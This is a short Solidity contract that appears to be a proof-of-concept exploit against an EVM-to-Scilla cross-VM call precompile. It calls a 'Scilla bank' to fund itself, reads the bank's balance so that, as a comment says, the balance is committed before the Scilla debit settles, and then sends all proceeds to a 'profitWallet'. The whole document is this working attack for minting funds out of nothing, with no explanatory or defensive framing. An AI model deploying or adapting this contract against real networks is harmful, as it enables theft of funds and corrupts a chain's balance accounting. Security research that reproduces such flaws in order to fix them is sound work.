// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

contract ScillaDebitSkipMinter {
    address constant SCILLA_CALL_PRECOMPILE =
        0x000000000000000000000000000000005a494c53;

    uint256 public observedScillaBankBalance;

    receive() external payable {}

    function mintBySkippingScillaDebit(
        address scillaBank,
        address payable profitWallet,
        uint128 scillaAmount
    ) external {
        // Ask the Scilla bank to send `scillaAmount` to this EVM contract.
        bytes memory args = abi.encode(
            scillaBank,
            "fundUser",
            uint256(0),
            address(this),
            scillaAmount
        );

        (bool ok, ) = SCILLA_CALL_PRECOMPILE.call(args);
        require(ok, "scilla call failed");

        // Reading the bank's balance pulls it into final EVM state before the Scilla debit settles.
        observedScillaBankBalance = scillaBank.balance;

        (bool sent, ) = profitWallet.call{value: address(this).balance}("");
        require(sent, "profit transfer failed");
    }
}
